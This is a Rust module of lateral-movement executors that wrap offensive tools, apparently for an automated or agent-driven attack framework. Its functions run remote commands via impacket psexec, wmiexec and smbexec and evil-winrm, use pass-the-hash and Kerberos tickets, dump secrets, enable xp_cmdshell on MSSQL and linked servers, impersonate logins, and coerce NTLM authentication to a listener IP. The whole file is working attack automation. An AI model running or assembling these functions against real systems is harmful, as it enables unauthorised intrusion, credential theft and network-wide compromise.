//! Lateral movement tool executors.
//!
//! Each function accepts a JSON `Value` containing the tool arguments and
//! returns a `ToolOutput` produced by running a CLI subprocess via
//! `CommandBuilder`.

use anyhow::Result;
use serde_json::Value;

use crate::args::{optional_bool, optional_i64, optional_str, required_str};
use crate::credentials;
use crate::executor::CommandBuilder;
use crate::ToolOutput;

// ---------------------------------------------------------------------------
// Remote Execution
// ---------------------------------------------------------------------------

/// Execute a command on a remote host via impacket-psexec.
///
/// Required args: `target`, `username`
/// Optional args: `password`, `hash`, `domain`, `command`
pub async fn psexec(args: &Value) -> Result<ToolOutput> {
    let target = required_str(args, "target")?;
    let username = required_str(args, "username")?;
    let password = optional_str(args, "password");
    let hash = optional_str(args, "hash");
    let domain = optional_str(args, "domain");
    let command =
        optional_str(args, "command").unwrap_or(r#"cmd.exe /c "whoami && hostname && ipconfig""#);

    let (auth_str, extra_args) =
        credentials::impacket_auth(domain, username, password, hash, target);

    CommandBuilder::new("impacket-psexec")
        .arg(&auth_str)
        .args(extra_args)
        .arg(command)
        .timeout_secs(120)
        .execute()
        .await
}

/// Execute a command on a remote host via impacket-psexec with Kerberos auth.
///
/// Required args: `target`, `username`, `domain`, `ticket_path`
/// Optional args: `dc_ip`, `target_ip`, `command`
pub async fn psexec_kerberos(args: &Value) -> Result<ToolOutput> {
    let target = required_str(args, "target")?;
    let username = required_str(args, "username")?;
    let domain = required_str(args, "domain")?;
    let ticket_path = required_str(args, "ticket_path")?;
    let dc_ip = optional_str(args, "dc_ip");
    let target_ip = optional_str(args, "target_ip");
    let command =
        optional_str(args, "command").unwrap_or(r#"cmd.exe /c "whoami && hostname && ipconfig""#);

    let target_str = format!("{domain}/{username}@{target}");
    let (env_key, env_val) = credentials::kerberos_env(ticket_path);

    CommandBuilder::new("impacket-psexec")
        .arg("-k")
        .arg("-no-pass")
        .arg(&target_str)
        .flag_opt("-dc-ip", dc_ip)
        .flag_opt("-target-ip", target_ip)
        .arg(command)
        .env(env_key, env_val)
        .timeout_secs(120)
        .execute()
        .await
}

/// Execute a command on a remote host via impacket-wmiexec.
///
/// Required args: `target`, `username`
/// Optional args: `password`, `hash`, `domain`, `command`
pub async fn wmiexec(args: &Value) -> Result<ToolOutput> {
    let target = required_str(args, "target")?;
    let username = required_str(args, "username")?;
    let password = optional_str(args, "password");
    let hash = optional_str(args, "hash");
    let domain = optional_str(args, "domain");
    let command = optional_str(args, "command").unwrap_or("whoami");

    let (auth_str, extra_args) =
        credentials::impacket_auth(domain, username, password, hash, target);

    CommandBuilder::new("impacket-wmiexec")
        .arg(&auth_str)
        .args(extra_args)
        .arg(command)
        .timeout_secs(120)
        .execute()
        .await
}

/// Execute a command on a remote host via impacket-wmiexec with Kerberos auth.
///
/// Required args: `target`, `username`, `domain`, `ticket_path`
/// Optional args: `dc_ip`, `target_ip`, `command`
pub async fn wmiexec_kerberos(args: &Value) -> Result<ToolOutput> {
    let target = required_str(args, "target")?;
    let username = required_str(args, "username")?;
    let domain = required_str(args, "domain")?;
    let ticket_path = required_str(args, "ticket_path")?;
    let dc_ip = optional_str(args, "dc_ip");
    let target_ip = optional_str(args, "target_ip");
    let command = optional_str(args, "command").unwrap_or("whoami");

    let target_str = format!("{domain}/{username}@{target}");
    let (env_key, env_val) = credentials::kerberos_env(ticket_path);

    CommandBuilder::new("impacket-wmiexec")
        .arg("-k")
        .arg("-no-pass")
        .arg(&target_str)
        .flag_opt("-dc-ip", dc_ip)
        .flag_opt("-target-ip", target_ip)
        .arg(command)
        .env(env_key, env_val)
        .timeout_secs(120)
        .execute()
        .await
}

/// Execute a command on a remote host via impacket-smbexec.
///
/// Required args: `target`, `username`
/// Optional args: `password`, `hash`, `domain`, `command`
pub async fn smbexec(args: &Value) -> Result<ToolOutput> {
    let target = required_str(args, "target")?;
    let username = required_str(args, "username")?;
    let password = optional_str(args, "password");
    let hash = optional_str(args, "hash");
    let domain = optional_str(args, "domain");
    let command = optional_str(args, "command").unwrap_or("whoami");

    let (auth_str, extra_args) =
        credentials::impacket_auth(domain, username, password, hash, target);

    CommandBuilder::new("impacket-smbexec")
        .arg(&auth_str)
        .args(extra_args)
        .arg(command)
        .timeout_secs(120)
        .execute()
        .await
}

/// Execute a command on a remote host via impacket-smbexec with Kerberos auth.
///
/// Required args: `target`, `username`, `domain`, `ticket_path`
/// Optional args: `dc_ip`, `target_ip`, `command`
pub async fn smbexec_kerberos(args: &Value) -> Result<ToolOutput> {
    let target = required_str(args, "target")?;
    let username = required_str(args, "username")?;
    let domain = required_str(args, "domain")?;
    let ticket_path = required_str(args, "ticket_path")?;
    let dc_ip = optional_str(args, "dc_ip");
    let target_ip = optional_str(args, "target_ip");
    let command = optional_str(args, "command").unwrap_or("whoami");

    let target_str = format!("{domain}/{username}@{target}");
    let (env_key, env_val) = credentials::kerberos_env(ticket_path);

    CommandBuilder::new("impacket-smbexec")
        .arg("-k")
        .arg("-no-pass")
        .arg(&target_str)
        .flag_opt("-dc-ip", dc_ip)
        .flag_opt("-target-ip", target_ip)
        .arg(command)
        .env(env_key, env_val)
        .timeout_secs(120)
        .execute()
        .await
}

/// Execute a command on a remote host via evil-winrm.
///
/// Required args: `target`, `username`
/// Optional args: `password`, `hash`, `command`
pub async fn evil_winrm(args: &Value) -> Result<ToolOutput> {
    let target = required_str(args, "target")?;
    let username = required_str(args, "username")?;
    let password = optional_str(args, "password");
    let hash = optional_str(args, "hash");
    let command = optional_str(args, "command").unwrap_or("whoami && hostname && ipconfig");

    let mut cmd = CommandBuilder::new("evil-winrm")
        .flag("-i", target)
        .flag("-u", username);

    cmd = match hash {
        Some(h) => cmd.flag("-H", h),
        None => match password {
            Some(p) => cmd.flag("-p", p),
            None => cmd,
        },
    };

    cmd.flag("-c", command).timeout_secs(120).execute().await
}

/// Test RDP authentication via xfreerdp.
///
/// Required args: `target`, `username`
/// Optional args: `password`, `hash`, `domain`
pub async fn xfreerdp(args: &Value) -> Result<ToolOutput> {
    let target = required_str(args, "target")?;
    let username = required_str(args, "username")?;
    let password = optional_str(args, "password");
    let hash = optional_str(args, "hash");
    let domain = optional_str(args, "domain");

    let mut cmd = CommandBuilder::new("xfreerdp")
        .arg(format!("/v:{target}"))
        .arg(format!("/u:{username}"));

    cmd = match hash {
        Some(h) => cmd.arg(format!("/pth:{h}")),
        None => match password {
            Some(p) => cmd.arg(format!("/p:{p}")),
            None => cmd,
        },
    };

    if let Some(d) = domain {
        cmd = cmd.arg(format!("/d:{d}"));
    }

    cmd.arg("/cert-ignore")
        .arg("+auth-only")
        .timeout_secs(30)
        .execute()
        .await
}

/// Execute a command on a remote host via SSH with password authentication.
///
/// Required args: `target`, `username`, `password`
/// Optional args: `port`, `command`
pub async fn ssh_with_password(args: &Value) -> Result<ToolOutput> {
    let target = required_str(args, "target")?;
    let username = required_str(args, "username")?;
    let password = required_str(args, "password")?;
    let port = optional_str(args, "port");
    let command = optional_str(args, "command").unwrap_or("whoami && hostname");

    let user_host = format!("{username}@{target}");

    let mut cmd = CommandBuilder::new("sshpass")
        .flag("-p", password)
        .arg("ssh")
        .arg("-o")
        .arg("StrictHostKeyChecking=no")
        .arg(&user_host);

    if let Some(p) = port {
        cmd = cmd.flag("-p", p);
    }

    cmd.arg(command).timeout_secs(120).execute().await
}

/// Dump secrets from a remote host via impacket-secretsdump with Kerberos auth.
///
/// Required args: `target`, `username`, `domain`, `ticket_path`
/// Optional args: `dc_ip`, `target_ip`, `timeout_minutes`
pub async fn secretsdump_kerberos(args: &Value) -> Result<ToolOutput> {
    let target = required_str(args, "target")?;
    let username = required_str(args, "username")?;
    let domain = required_str(args, "domain")?;
    let ticket_path = required_str(args, "ticket_path")?;
    let dc_ip = optional_str(args, "dc_ip");
    let target_ip = optional_str(args, "target_ip");
    let timeout_minutes = optional_i64(args, "timeout_minutes").unwrap_or(3);
    let timeout_secs = (timeout_minutes * 60) as u64;

    let target_str = format!("{domain}/{username}@{target}");
    let (env_key, env_val) = credentials::kerberos_env(ticket_path);

    CommandBuilder::new("impacket-secretsdump")
        .arg("-k")
        .arg("-no-pass")
        .arg(&target_str)
        .flag_opt("-dc-ip", dc_ip)
        .flag_opt("-target-ip", target_ip)
        .env(env_key, env_val)
        .timeout_secs(timeout_secs)
        .execute()
        .await
}

// ---------------------------------------------------------------------------
// Pass-the-Hash
// ---------------------------------------------------------------------------

/// Build a pth-style credential string: `domain/username%hash` or `username%hash`.
fn pth_cred_string(domain: Option<&str>, username: &str, hash: &str) -> String {
    match domain {
        Some(d) if !d.is_empty() => format!("{d}/{username}%{hash}"),
        _ => format!("{username}%{hash}"),
    }
}

/// Execute a command on a remote host via pth-winexe.
///
/// Required args: `target`, `username`, `hash`
/// Optional args: `domain`, `command`
pub async fn pth_winexe(args: &Value) -> Result<ToolOutput> {
    let target = required_str(args, "target")?;
    let username = required_str(args, "username")?;
    let hash = required_str(args, "hash")?;
    let domain = optional_str(args, "domain");
    let command = optional_str(args, "command").unwrap_or("cmd.exe /c whoami");

    let cred = pth_cred_string(domain, username, hash);

    CommandBuilder::new("pth-winexe")
        .flag("-U", &cred)
        .arg(format!("//{target}"))
        .arg(command)
        .timeout_secs(120)
        .execute()
        .await
}

/// Access an SMB share on a remote host via pth-smbclient.
///
/// Required args: `target`, `username`, `hash`
/// Optional args: `domain`, `share`, `command`
pub async fn pth_smbclient(args: &Value) -> Result<ToolOutput> {
    let target = required_str(args, "target")?;
    let username = required_str(args, "username")?;
    let hash = required_str(args, "hash")?;
    let domain = optional_str(args, "domain");
    let share = optional_str(args, "share").unwrap_or("C$");
    let command = optional_str(args, "command").unwrap_or("dir");

    let cred = pth_cred_string(domain, username, hash);

    CommandBuilder::new("pth-smbclient")
        .arg(format!("//{target}/{share}"))
        .flag("-U", &cred)
        .flag("-c", command)
        .timeout_secs(120)
        .execute()
        .await
}

/// Execute an RPC command on a remote host via pth-rpcclient.
///
/// Required args: `target`, `username`, `hash`
/// Optional args: `domain`, `command`
pub async fn pth_rpcclient(args: &Value) -> Result<ToolOutput> {
    let target = required_str(args, "target")?;
    let username = required_str(args, "username")?;
    let hash = required_str(args, "hash")?;
    let domain = optional_str(args, "domain");
    let command = optional_str(args, "command").unwrap_or("getusername");

    let cred = pth_cred_string(domain, username, hash);

    CommandBuilder::new("pth-rpcclient")
        .flag("-U", &cred)
        .arg(target)
        .flag("-c", command)
        .timeout_secs(120)
        .execute()
        .await
}

/// Execute a WMI query on a remote host via pth-wmis.
///
/// Required args: `target`, `username`, `hash`
/// Optional args: `domain`, `query`
pub async fn pth_wmic(args: &Value) -> Result<ToolOutput> {
    let target = required_str(args, "target")?;
    let username = required_str(args, "username")?;
    let hash = required_str(args, "hash")?;
    let domain = optional_str(args, "domain");
    let query = optional_str(args, "query").unwrap_or("SELECT * FROM Win32_OperatingSystem");

    let cred = pth_cred_string(domain, username, hash);

    CommandBuilder::new("pth-wmis")
        .flag("-U", &cred)
        .arg(format!("//{target}"))
        .arg(query)
        .timeout_secs(120)
        .execute()
        .await
}

// ---------------------------------------------------------------------------
// Kerberos
// ---------------------------------------------------------------------------

/// Request a TGT via impacket-getTGT.
///
/// Required args: `domain`, `username`
/// Optional args: `password`, `hash`, `dc_ip`
pub async fn get_tgt(args: &Value) -> Result<ToolOutput> {
    let domain = required_str(args, "domain")?;
    let username = required_str(args, "username")?;
    let password = optional_str(args, "password");
    let hash = optional_str(args, "hash");
    let dc_ip = optional_str(args, "dc_ip");

    let user_string = match password {
        Some(p) => format!("{domain}/{username}:{p}"),
        None => format!("{domain}/{username}"),
    };

    let mut cmd = CommandBuilder::new("impacket-getTGT").arg(&user_string);

    if let Some(h) = hash {
        let hash_args = credentials::hash_args(h);
        cmd = cmd.args(hash_args);
    }

    cmd.flag_opt("-dc-ip", dc_ip)
        .timeout_secs(60)
        .execute()
        .await
}

// ---------------------------------------------------------------------------
// MSSQL
// ---------------------------------------------------------------------------

/// Build common MSSQL command prefix with auth and optional -windows-auth flag.
fn mssql_base(
    domain: Option<&str>,
    username: &str,
    password: Option<&str>,
    target: &str,
    windows_auth: bool,
) -> CommandBuilder {
    let auth_str = credentials::impacket_target(domain, username, password, target);

    CommandBuilder::new("impacket-mssqlclient")
        .arg(&auth_str)
        .arg_if(windows_auth, "-windows-auth")
        .timeout_secs(120)
}

/// Extract common MSSQL args from JSON and build a base CommandBuilder.
fn mssql_from_args(args: &Value) -> Result<CommandBuilder> {
    let target = required_str(args, "target")?;
    let username = required_str(args, "username")?;
    let password = optional_str(args, "password");
    let domain = optional_str(args, "domain");
    let windows_auth = optional_bool(args, "windows_auth").unwrap_or(false);

    Ok(mssql_base(domain, username, password, target, windows_auth))
}

/// Execute a SQL command via impacket-mssqlclient.
///
/// Required args: `target`, `username`, `command`
/// Optional args: `password`, `domain`, `windows_auth`
pub async fn mssql_command(args: &Value) -> Result<ToolOutput> {
    let command = required_str(args, "command")?;

    mssql_from_args(args)?.flag("-Q", command).execute().await
}

/// Enable xp_cmdshell on a MSSQL server.
///
/// Required args: `target`, `username`
/// Optional args: `password`, `domain`, `windows_auth`
pub async fn mssql_enable_xp_cmdshell(args: &Value) -> Result<ToolOutput> {
    let query = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; \
                 EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;";

    mssql_from_args(args)?.flag("-Q", query).execute().await
}

/// Enumerate impersonation permissions on a MSSQL server.
///
/// Required args: `target`, `username`
/// Optional args: `password`, `domain`, `windows_auth`
pub async fn mssql_enum_impersonation(args: &Value) -> Result<ToolOutput> {
    let query = "SELECT * FROM sys.server_permissions WHERE type = 'IM';";

    mssql_from_args(args)?.flag("-Q", query).execute().await
}

/// Impersonate a login and execute a query on a MSSQL server.
///
/// Required args: `target`, `username`, `impersonate_user`, `query`
/// Optional args: `password`, `domain`, `windows_auth`
pub async fn mssql_impersonate(args: &Value) -> Result<ToolOutput> {
    let impersonate_user = required_str(args, "impersonate_user")?;
    let query = required_str(args, "query")?;

    let full_query = format!("EXECUTE AS LOGIN = '{impersonate_user}'; {query}");

    mssql_from_args(args)?
        .flag("-Q", &full_query)
        .execute()
        .await
}

/// Enumerate linked servers on a MSSQL server.
///
/// Required args: `target`, `username`
/// Optional args: `password`, `domain`, `windows_auth`
pub async fn mssql_enum_linked_servers(args: &Value) -> Result<ToolOutput> {
    mssql_from_args(args)?
        .flag("-Q", "EXEC sp_linkedservers;")
        .execute()
        .await
}

/// Execute a query on a linked MSSQL server.
///
/// Required args: `target`, `username`, `linked_server`, `query`
/// Optional args: `password`, `domain`, `windows_auth`
pub async fn mssql_exec_linked(args: &Value) -> Result<ToolOutput> {
    let linked_server = required_str(args, "linked_server")?;
    let query = required_str(args, "query")?;

    let full_query = format!("EXEC ('{query}') AT [{linked_server}];");

    mssql_from_args(args)?
        .flag("-Q", &full_query)
        .execute()
        .await
}

/// Enable xp_cmdshell on a linked MSSQL server.
///
/// Required args: `target`, `username`, `linked_server`
/// Optional args: `password`, `domain`, `windows_auth`
pub async fn mssql_linked_enable_xpcmdshell(args: &Value) -> Result<ToolOutput> {
    let linked_server = required_str(args, "linked_server")?;

    let full_query = format!(
        "EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE; \
         EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [{linked_server}];"
    );

    mssql_from_args(args)?
        .flag("-Q", &full_query)
        .execute()
        .await
}

/// Execute a command via xp_cmdshell on a linked MSSQL server.
///
/// Required args: `target`, `username`, `linked_server`, `command`
/// Optional args: `password`, `domain`, `windows_auth`
pub async fn mssql_linked_xpcmdshell(args: &Value) -> Result<ToolOutput> {
    let linked_server = required_str(args, "linked_server")?;
    let command = required_str(args, "command")?;

    let full_query = format!("EXEC ('xp_cmdshell ''{command}''') AT [{linked_server}];");

    mssql_from_args(args)?
        .flag("-Q", &full_query)
        .execute()
        .await
}

/// Coerce NTLM authentication from a MSSQL server via xp_dirtree.
///
/// Required args: `target`, `username`, `listener_ip`
/// Optional args: `password`, `domain`, `windows_auth`
pub async fn mssql_ntlm_coerce(args: &Value) -> Result<ToolOutput> {
    let listener_ip = required_str(args, "listener_ip")?;

    let full_query = format!("EXEC master..xp_dirtree '\\\\{listener_ip}\\share'");

    mssql_from_args(args)?
        .flag("-Q", &full_query)
        .execute()
        .await
}
